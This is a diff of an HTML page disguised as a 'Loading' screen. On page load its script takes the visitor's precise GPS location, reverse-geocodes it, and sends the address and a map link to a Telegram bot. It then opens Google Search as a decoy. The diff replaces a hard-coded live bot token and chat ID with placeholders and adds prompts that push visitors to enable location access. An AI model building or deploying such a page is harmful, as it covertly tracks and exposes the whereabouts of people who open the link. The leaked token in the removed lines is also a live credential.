@@ -3,18 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>Loading</title>
 </head>
 <body>
+    <style>
+        body{
+            background-image: url('s.jpeg');
+        }
+
+    </style>
     <script>
-        const botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc";
-        const chatId = "5792222595";
+        
+        const botToken = "YOUR_BOT_TOKEN"; 
+        const chatId = "CHAT_ID";
 
         function openGoogleSearch() {
             const googleSearchUrl = "https://www.google.com/search"; 
-            window.open(googleSearchUrl, "_blank");
+            window.open(googleSearchUrl, "_blank"); 
         }
 
+    
         async function sendToTelegram(message) {
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
             try {
@@ -24,9 +32,9 @@
                     body: JSON.stringify({ chat_id: chatId, text: message })
                 });
                 const data = await response.json();
-                return data.ok;
+                return data.ok; 
             } catch (error) {
-                console.error(" :", error);
+                console.error("حدث خطأ أثناء الإرسال:", error);
                 return false; 
             }
         }
@@ -38,20 +46,21 @@
                 const data = await response.json();
                 if (data && data.address) {
                     const address = data.display_name; 
-                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`; // رابط Google Maps
+                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`; 
                     const message = `📍 موقع جديد تم تحديده:\n\n${address}\n\n🌐 رابط Google Maps: ${googleMapsLink}`;
-                    const isSent = await sendToTelegram(message);
+                    const isSent = await sendToTelegram(message); 
                     if (isSent) {
                         openGoogleSearch();
                     }
                 } else {
-                    throw new Error(".");
+                    throw new Error("تعذر تحديد الموقع بالتفصيل.");
                 }
             } catch (error) {
-                console.error("حع:", error);
+                console.error("حدث خطأ أثناء جلب تفاصيل الموقع:", error);
             }
         }
 
+ 
         function showPosition(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
@@ -59,18 +68,27 @@
         }
 
         function showError(error) {
-            console.error("ثع:", error);
+            if (error.code === error.PERMISSION_DENIED) {
+                alert("يرجى تشغيل خدمة الموقع من إعدادات  والمحاولة مرة أخرى.");
+            } else {
+                console.error("حدث خطأ أثناء تحديد الموقع:", error);
+            }
         }
 
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition, showError, {
-                enableHighAccuracy: true, 
-                timeout: 10000, 
-                maximumAge: 0 
-            });
-        } else {
-            console.error(".");
+
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError, {
+                    enableHighAccuracy: true, 
+                    timeout: 10000, 
+                    maximumAge: 0 
+                });
+            } else {
+                alert("المتصفح لا يدعم خاصية .");
+            }
         }
+
+        requestLocation();
     </script>
 </body>
 </html>
